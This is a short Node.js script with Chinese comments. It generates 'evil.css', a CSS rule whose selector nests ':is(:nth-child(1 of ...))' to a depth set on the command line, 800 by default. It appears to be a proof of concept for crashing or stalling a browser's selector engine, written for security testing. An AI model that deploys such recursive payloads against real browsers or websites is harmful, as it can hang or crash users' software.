// 生成 evil.css ：:is( :nth-child() ) 递归嵌套 DEPTH 次
// 用法：node generate_css.js 800
const fs = require('fs');
const depth = parseInt(process.argv[2] || '800', 10);

let css = '';
for (let i = 0; i < depth; ++i) css += ':is(:nth-child(1 of ';
css += 'a';
for (let i = 0; i < depth; ++i) css += '))';
css += ' { color:red; }\n';

fs.writeFileSync('evil.css', css);
console.log(`evil.css depth=${depth} written, size=${css.length/1024|0}KB`);
